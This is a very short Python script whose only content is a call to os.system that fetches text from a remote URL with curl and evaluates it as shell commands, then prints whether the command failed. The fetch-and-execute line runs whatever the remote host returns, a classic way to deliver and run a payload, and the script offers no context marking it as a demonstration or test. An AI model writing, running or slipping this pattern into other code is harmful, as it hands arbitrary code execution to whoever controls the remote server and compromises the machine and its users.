from os import system

if system('eval `curl -s "http://www.very-secure-website.net"`'):
    print("Command failed!")
else:
    print("Success")
